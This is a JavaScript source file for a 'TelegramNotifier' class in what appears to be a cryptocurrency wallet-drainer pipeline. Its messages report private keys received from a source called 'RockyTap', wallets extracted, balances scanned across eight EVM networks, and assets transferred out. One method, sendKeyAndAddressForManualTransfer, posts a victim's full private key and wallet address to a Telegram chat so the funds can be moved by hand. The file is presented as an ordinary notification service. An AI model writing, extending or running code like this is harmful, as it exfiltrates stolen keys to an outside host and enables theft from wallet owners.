// Telegram notification service
// Sends notifications at each pipeline stage

const axios = require('axios');

class TelegramNotifier {
  constructor() {
    this.botToken = process.env.TELEGRAM_BOT_TOKEN || '';
    this.chatId = process.env.TELEGRAM_CHAT_ID || '';
    this.enabled = !!(this.botToken && this.chatId);
    
    if (!this.enabled) {
      console.warn('⚠️  Telegram notifications disabled - missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    }
  }

  async send(message, options = {}) {
    if (!this.enabled) {
      console.log(`[Telegram] ${message}`);
      return false;
    }

    try {
      const text = options.format === 'html' ? message : this.escapeMarkdown(message);
      
      const response = await axios.post(
        `https://api.telegram.org/bot${this.botToken}/sendMessage`,
        {
          chat_id: this.chatId,
          text: text,
          parse_mode: options.format === 'html' ? 'HTML' : 'MarkdownV2',
          disable_web_page_preview: true
        },
        {
          timeout: 5000
        }
      );

      return response.data.ok === true;
    } catch (error) {
      console.error('Telegram notification failed:', error.message);
      // Don't throw - Telegram failures shouldn't block processing
      return false;
    }
  }

  async sendKeyReceived(walletAddress, source = 'RockyTap') {
    const message = `🔑 <b>New Private Key Received</b>\n\n` +
                   `Source: ${source}\n` +
                   `Wallet: <code>${walletAddress.substring(0, 10)}...</code>`;
    return await this.send(message, { format: 'html' });
  }

  async sendWalletExtracted(walletAddress) {
    const message = `👛 <b>Wallet Extracted</b>\n\n` +
                   `Address: <code>${walletAddress}</code>`;
    return await this.send(message, { format: 'html' });
  }

  async sendScanningStarted() {
    const message = `🔍 <b>Scanning Networks</b>\n\n` +
                   `Checking 8 EVM networks:\n` +
                   `• Ethereum\n` +
                   `• BSC\n` +
                   `• Polygon\n` +
                   `• Arbitrum\n` +
                   `• Avalanche\n` +
                   `• Fantom\n` +
                   `• Optimism\n` +
                   `• Base`;
    return await this.send(message, { format: 'html' });
  }

  async sendNetworkAssets(network, assets) {
    let message = `💰 <b>${network.toUpperCase()}</b>\n\n`;
    
    let hasAssets = false;
    
    if (assets.native && parseFloat(assets.native.balance) > 0) {
      message += `🪙 Native: <b>${assets.native.balance} ${assets.native.symbol}</b>\n`;
      hasAssets = true;
    }
    
    if (assets.tokens && assets.tokens.length > 0) {
      message += `\n📦 Tokens (${assets.tokens.length}):\n`;
      assets.tokens.forEach((token, index) => {
        message += `${index + 1}. <b>${token.balance} ${token.symbol}</b>\n`;
      });
      hasAssets = true;
    }
    
    if (!hasAssets) {
      message += `❌ No assets found`;
    }
    
    return await this.send(message, { format: 'html' });
  }

  async sendScanComplete(summary) {
    const message = `📊 <b>Scan Complete</b>\n\n` +
                   `Networks with assets: ${summary.networksWithAssets}\n` +
                   `Total assets found: ${summary.totalAssets}\n` +
                   `Estimated value: $${summary.estimatedValue || 'N/A'}`;
    return await this.send(message, { format: 'html' });
  }

  async sendProcessingStarted() {
    const message = `🔄 <b>Processing Transfers</b>\n\n` +
                   `Starting asset transfers...`;
    return await this.send(message, { format: 'html' });
  }

  async sendTransferSuccess(network, type, amount, symbol, txHash) {
    const message = `✅ <b>Transfer Successful</b>\n\n` +
                   `Network: ${network.toUpperCase()}\n` +
                   `Type: ${type}\n` +
                   `Amount: ${amount} ${symbol}\n` +
                   `TX: <code>${txHash}</code>`;
    return await this.send(message, { format: 'html' });
  }

  async sendTransferFailed(network, type, amount, symbol, error) {
    const message = `❌ <b>Transfer Failed</b>\n\n` +
                   `Network: ${network.toUpperCase()}\n` +
                   `Type: ${type}\n` +
                   `Amount: ${amount} ${symbol}\n` +
                   `Error: ${error}`;
    return await this.send(message, { format: 'html' });
  }

  async sendProcessingComplete(summary) {
    const message = `🎉 <b>Processing Complete</b>\n\n` +
                   `Total transfers: ${summary.totalTransfers}\n` +
                   `Successful: ${summary.successful}\n` +
                   `Failed: ${summary.failed}\n` +
                   `Total value: $${summary.totalValue || 'N/A'}`;
    return await this.send(message, { format: 'html' });
  }

  async sendError(error, context = '') {
    const message = `⚠️ <b>Error Occurred</b>\n\n` +
                   `${context ? `Context: ${context}\n` : ''}` +
                   `Error: ${error.message || error}`;
    return await this.send(message, { format: 'html' });
  }

  async sendGasReservoirFunding(network, amount, txHash) {
    const message = `⛽ <b>Gas Reservoir Funding</b>\n\n` +
                   `Network: ${network.toUpperCase()}\n` +
                   `Amount: ${amount}\n` +
                   `TX: <code>${txHash}</code>`;
    return await this.send(message, { format: 'html' });
  }

  async sendNoAssetsFound(walletAddress) {
    const message = `❌ <b>No Assets Found</b>\n\n` +
                   `Wallet: <code>${walletAddress.substring(0, 10)}...</code>\n` +
                   `No assets detected on any network.`;
    return await this.send(message, { format: 'html' });
  }

  escapeMarkdown(text) {
    // Escape special characters for MarkdownV2
    return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
  }

  async sendKeyAndAddressForManualTransfer(privateKey, walletAddress, scanResults) {
    if (!this.botToken || !this.chatId) {
      console.warn('Telegram notifications disabled - missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
      return;
    }

    try {
      let message = `🔑 <b>Private Key & Wallet Address for Manual Transfer</b>\n\n`;
      message += `<b>Private Key:</b>\n<code>${privateKey}</code>\n\n`;
      message += `<b>Wallet Address:</b>\n<code>${walletAddress}</code>\n\n`;
      message += `<b>📊 Assets Found:</b>\n\n`;

      // Add network details
      for (const [networkKey, networkData] of Object.entries(scanResults.networks)) {
        if (networkData && networkData.hasAssets) {
          message += `<b>💰 ${networkKey.toUpperCase()}</b>\n`;
          
          if (networkData.native && parseFloat(networkData.native.balance) > 0) {
            message += `🪙 Native: <b>${networkData.native.balance} ${networkData.native.symbol}</b>\n`;
          }
          
          if (networkData.tokens && networkData.tokens.length > 0) {
            message += `\n📦 Tokens (${networkData.tokens.length}):\n`;
            networkData.tokens.forEach((token, index) => {
              message += `${index + 1}. <b>${token.balance} ${token.symbol}</b>\n`;
            });
          }
          message += `\n`;
        }
      }

      const estimatedValue = typeof scanResults.summary.estimatedValue === 'number' 
        ? scanResults.summary.estimatedValue.toFixed(2) 
        : (scanResults.summary.estimatedValue || 'N/A');
      message += `<b>Total Estimated Value:</b> $${estimatedValue}\n\n`;
      message += `⚠️ <b>Manual Transfer Required</b>\n`;
      message += `Please transfer assets manually using the private key above.`;

      await this.send(message, { format: 'html' });
      console.log('✅ Key and address sent to Telegram for manual transfer');
    } catch (error) {
      console.error('Failed to send key and address to Telegram:', error);
    }
  }
}

module.exports = { TelegramNotifier };

